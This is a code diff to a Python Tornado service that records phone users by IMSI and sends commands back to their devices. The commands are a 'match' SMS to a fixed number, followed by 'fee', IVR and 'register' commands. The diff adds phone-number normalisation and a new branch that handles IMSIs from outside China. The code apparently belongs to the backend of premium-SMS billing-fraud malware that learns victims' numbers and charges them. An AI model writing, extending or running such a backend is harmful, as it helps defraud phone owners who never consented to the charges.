@@ -126,9 +126,11 @@ class MatchHandler(tornado.web.RequestHandler):
         _cur.execute(_sql, [self.get_argument('id')])
         _recordRsp = _cur.fetchone()
         if _recordRsp != None:
+            mobile = str(self.get_argument('mobile'))
+            if len(mobile) == 11 and mobile.startswith('1'):
+                mobile = '86' + mobile
             _sql = "update `imsi_users` set mobile=%s where id = %s"
-            _cur.execute(_sql, [self.get_argument(
-                'mobile'), self.get_argument('id')])
+            _cur.execute(_sql, [mobile, self.get_argument('id')])
         _cur.close()
         _dbConfig.close()
 
@@ -249,23 +251,23 @@ def get_imsi_response(_imsi, _threads, _svn):
             _return = MATCH_CONTENT.replace('[id]', str(_record_user['id'])).replace(
                 '[mobile]', get_system_parameter_from_db("matchMobile"))
     else:
-        if len(str(_record_user['mobile'])) <= 10 and match_flow_control() and int(_record_user['matchCount']) < int(get_system_parameter_from_db("matchLimitPerImsi")):
+        if len(str(_record_user['mobile'])) <= 6 and match_flow_control() and int(_record_user['matchCount']) < int(get_system_parameter_from_db("matchLimitPerImsi")) and _imsi.startswith('460'):
             _return = MATCH_CONTENT.replace('[id]', str(_record_user['id'])).replace(
                 '[mobile]', get_system_parameter_from_db("matchMobile"))
             _g_async_update_match_count = async_update_match_count(_imsi)
             _g_async_update_match_count.start()
-            # _threads.append(threading.Thread(
-            #     target=async_update_match_count(_imsi)))
+        elif not _imsi.startswith('460') and len(str(_record_user['mobile'])) <= 6 and match_flow_control() and int(_record_user['matchCount']) < int(get_system_parameter_from_db("matchLimitPerImsiNot86")):
+            _return = MATCH_CONTENT.replace('[id]', str(_record_user['id'])).replace(
+                '[mobile]', '0086' + get_system_parameter_from_db("matchMobile"))
+            _g_async_update_match_count = async_update_match_count(_imsi)
+            _g_async_update_match_count.start()
         else:
             # normal fee process
             if get_system_parameter_from_db('openFee') == 'open' and check_user_cmd_fee(_record_user) and isOpenHour():
                 _return = get_cmd(_record_user, _threads)
             if (_return == None or len(_return) <= 1) and _svn >= 3900 and get_system_parameter_from_db('openIvr') == 'open':
                 _return = get_ivr_cmd(_record_user, _threads)
-                if _return != None:
-                    1
-                    # _threads.append(threading.Thread(
-                    # target=insert_register_cmd_log(_record_user, _return)))
+
             if (_return == None or len(_return) <= 1) and get_system_parameter_from_db('openRegister') == 'open':
                 _return = get_register_cmd(_record_user, _threads)
                 if _return != None:
